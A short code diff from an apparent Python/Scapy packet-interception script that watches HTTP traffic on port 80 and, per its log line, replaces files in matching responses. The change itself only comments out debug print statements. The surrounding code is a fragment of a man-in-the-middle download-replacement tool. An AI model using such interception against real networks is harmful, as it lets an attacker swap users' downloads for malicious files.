@@ -29,9 +29,10 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] HTTP Request outbound found")
-            print(scapy_packet.show())
+            #print(scapy_packet.show())
         elif scapy_packet[scapy.TCP].sport == 80: #if this exists, packet is HTTP response inbound
             print("[+] HTTP Response Inbound found")
+            #print(scapy_packet.show())
             if scapy_packet[scapy.TCP].seq in ack_list: #if SEQ is in ack list, there are packets that match
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
